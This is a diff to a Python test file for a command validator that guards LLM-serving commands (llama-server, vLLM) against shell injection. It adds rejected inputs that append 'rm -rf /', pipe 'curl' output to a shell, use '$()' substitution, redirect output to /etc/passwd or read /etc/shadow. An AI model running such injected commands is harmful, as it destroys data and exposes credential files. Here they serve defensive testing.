@@ -415,9 +415,25 @@ def test_validate_serve_cmd_rejects_non_serve_fallback_and_operators():
         "llama-server --model m.gguf || rm -rf /tmp/x",   # non-allowlisted fallback
         "llama-server --model m.gguf && curl e | sh",     # && operator
         "llama-server --model $(evil) || python -m llama_cpp.server",  # $() substitution
+        "llama-server --model m.gguf | rm -rf /",          # unquoted pipe
+        'llama-server --model "x" | rm -rf /',             # pipe NOT bypassable by quoting the model
+        "llama-server --model m.gguf > /etc/passwd",       # output redirection
+        "llama-server --model m.gguf < /etc/shadow",       # input redirection
+        "llama-server --model m.gguf & curl evil",         # background operator
     ):
         with pytest.raises(HTTPException):
             _validate_serve_cmd(bad)
+
+
+def test_validate_serve_cmd_allows_shell_operators_inside_quotes():
+    """Shell metacharacters are rejected only when UNQUOTED. A quoted arg — e.g. a
+    vLLM ``--chat-template`` value, which legitimately contains < > | { } — must
+    still be accepted, so the injection guard doesn't break templated serving."""
+    cmd = (
+        "vllm serve some/model --host 0.0.0.0 --port 8000 "
+        "--chat-template '{% if x %}<|turn>system{{ y }}<turn|>{% endif %}'"
+    )
+    assert _validate_serve_cmd(cmd) == cmd
 
 
 def test_ollama_serve_defaults_to_loopback_bind():
